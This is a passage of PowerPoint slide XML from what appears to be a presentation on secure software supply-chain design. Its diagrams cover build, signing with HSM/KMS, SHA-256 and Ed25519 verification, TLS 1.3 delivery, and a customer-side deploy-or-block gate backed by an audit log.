              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DISTRIBUTION  (untrusted)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5715000" y="1371600"/>
            <a:ext cx="3108960" cy="4343400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4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5715000" y="1399032"/>
            <a:ext cx="3108960" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>CUSTOMER CI/CD</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Rounded Rectangle 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1719072"/>
            <a:ext cx="2423160" cy="402336"/>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Developer (MFA)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Rounded Rectangle 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2231136"/>
            <a:ext cx="2423160" cy="402336"/>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Source repository</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="13" name="Connector 12"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="2121408"/>
            <a:ext cx="0" cy="10972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4" name="Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="2743200"/>
            <a:ext cx="2423160" cy="402336"/>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Secure build</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="15" name="Connector 14"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="2633472"/>
            <a:ext cx="0" cy="10972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6" name="Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="3255264"/>
            <a:ext cx="2423160" cy="402336"/>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Security tests</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="17" name="Connector 16"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="3145536"/>
            <a:ext cx="0" cy="10972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502920" y="3767328"/>
            <a:ext cx="2423160" cy="402336"/>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SHA-256 + provenance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="19" name="Connector 18"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="3657600"/>
            <a:ext cx="0" cy="10972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0" name="Rounded Rectangle 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4279392"/>
            <a:ext cx="2423160" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D6E6F7"/>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Signing service</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>HSM/KMS · RBAC+MFA</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="21" name="Connector 20"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="4169664"/>
            <a:ext cx="0" cy="10972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Rounded Rectangle 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="4956048"/>
            <a:ext cx="2423160" cy="566928"/>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Signed manifest</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>+ artifact</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="23" name="Connector 22"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1714500" y="4846320"/>
            <a:ext cx="0" cy="10972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3429000" y="2377440"/>
            <a:ext cx="1965960" cy="6858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Artifact registry</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1000" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>+ root-signed trust policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Rounded Rectangle 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3429000" y="3611880"/>
            <a:ext cx="1965960" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C5CDD6"/>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TLS 1.3 channel</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="26" name="Connector 25"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="2926080" y="2743200"/>
            <a:ext cx="502920" cy="2496312"/>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4411980" y="3063240"/>
            <a:ext cx="0" cy="548640"/>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28" name="Rounded Rectangle 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="1737360"/>
            <a:ext cx="2743200" cy="50292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Customer CI</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="950" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>pinned root public key</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="29" name="Connector 28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="5394960" y="2103120"/>
            <a:ext cx="502920" cy="175564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0" name="Rounded Rectangle 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="2395728"/>
            <a:ext cx="2743200" cy="1481328"/>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1" name="TextBox 30"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="2414016"/>
            <a:ext cx="2743200" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Verification engine</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Rounded Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Signature</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Rounded Rectangle 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Rounded Rectangle 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726679" y="274320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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Key status</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Rounded Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5989320" y="329184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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Version</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Rounded Rectangle 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6858000" y="329184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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Provenance</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="37" name="Rounded Rectangle 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7726679" y="3291840"/>
            <a:ext cx="804672"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950" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Policy</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="38" name="Connector 37"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="2240280"/>
            <a:ext cx="0" cy="155448"/>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Rounded Rectangle 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6583680" y="4069080"/>
            <a:ext cx="1371600" cy="4114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222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Security gate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="40" name="Connector 39"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7269480" y="3877056"/>
            <a:ext cx="0" cy="192024"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="51606F"/>
            </a:solidFill>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="accent1"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent1"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent1"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Rounded Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="4754880"/>
            <a:ext cx="1234440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D5F0DE"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1A7F4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i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>DEPLOY</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="42" name="Rounded Rectangle 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7406640" y="4754880"/>
            <a:ext cx="1234440" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBD9D6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="B42318"/>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300" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="B42318"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>BLOCK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="900" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>+ security event</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="43" name="Connector 42"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="6510528" y="4480560"/>
            <a:ext cx="438912" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="1A7F4B"/>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4" name="Connector 43"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="4480560"/>
            <a:ext cx="438911" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="19050">
            <a:solidFill>
              <a:srgbClr val="B42318"/>
            </a:solidFill>
            <a:tailEnd type="triangle" w="med" len="med"/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="2">
            <a:schemeClr val="accent1"/>
          </a:lnRef>
          <a:fillRef idx="0">
            <a:schemeClr val="accent1"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent1"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="tx1"/>
          </a:fontRef>
        </p:style>
      </p:cxnSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="45" name="Rounded Rectangle 44"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="5833872"/>
            <a:ext cx="8503920" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4DE"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="C9A24B"/>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36576" bIns="36576"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr sz="1150" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="8A5A00"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Hash-chained audit / transparency log: every signing operation and every DEPLOY / BLOCK decision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Cryptographic Design</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Rounded Rectangle 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="1371600"/>
            <a:ext cx="2697480" cy="16916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475488" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1F3864"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>SHA-256</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="TextBox 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Integrity fingerprint</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="TextBox 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="475488" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Any 1-bit change gives a new digest. NOT authentication: anyone can hash a malicious file.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rounded Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3200400" y="1371600"/>
            <a:ext cx="2697480" cy="16916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10128" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="1A7F4B"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>Ed25519</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Authenticity + integrity</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="TextBox 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3310128" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Vendor signs with a private key that is never distributed; customers verify with the trusted public key.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1371600"/>
            <a:ext cx="2697480" cy="16916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44768" y="1417320"/>
            <a:ext cx="2468880" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="5B4BB0"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman"/>
              </a:rPr>
              <a:t>TLS 1.3</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="1783080"/>
            <a:ext cx="2468880" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1200" b="1" i="0">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Channel protection</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="TextBox 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6144768" y="2075688"/>
            <a:ext cx="2514600" cy="960120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1150" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="222222"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>ECDHE + AES-GCM, server auth, no downgrade. Cannot prove the file on the server is genuine.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17" name="Picture 16" descr="crypto_flow.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1097280" y="3182112"/>
            <a:ext cx="6949440" cy="2898640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="TextBox 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="365760" y="6144768"/>
            <a:ext cx="8412480" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" anchor="t" lIns="45720" rIns="45720">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr">
              <a:spcAft>
                <a:spcPts val="400"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1050" b="0" i="1">
                <a:solidFill>
                  <a:srgbClr val="56606B"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Domain-separated signatures over canonical JSON  ·  PKI: pinned root key → release keys  ·  AES-256 only for keys at rest</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Key Management</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
